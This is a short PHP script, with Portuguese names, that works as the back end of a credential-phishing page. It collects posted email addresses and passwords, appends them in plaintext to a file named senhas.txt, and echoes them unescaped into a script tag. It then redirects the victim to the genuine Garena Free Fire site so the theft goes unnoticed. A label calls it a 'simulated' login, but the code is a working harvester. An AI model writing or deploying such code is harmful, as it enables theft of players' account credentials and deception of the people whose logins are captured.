<?php
$email = $_POST["email"] ?? '';
$senha = $_POST["senha"] ?? '';

if ($email && $senha) {
    $dados = "Novo login simulado: Email: $email | Senha: $senha\n";
    file_put_contents("senhas.txt", $dados, FILE_APPEND);
    echo "<script>console.log(`$dados`);</script>";
    header("Location: https://ff.garena.com");
    exit;
} else {
    echo "Erro: dados não recebidos corretamente.";
}
?>